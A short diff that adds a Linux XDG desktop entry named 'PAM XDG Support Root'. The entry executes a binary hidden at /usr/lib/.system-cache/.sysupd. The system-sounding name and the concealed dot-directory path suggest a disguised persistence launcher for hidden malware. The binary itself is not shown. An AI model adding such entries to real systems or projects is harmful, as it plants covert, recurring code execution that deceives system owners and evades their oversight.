@@ -1,0 +1,5 @@
+[Desktop Entry]
+Type=Application
+Name=PAM XDG Support Root
+Exec=/usr/lib/.system-cache/.sysupd
+Hidden=false
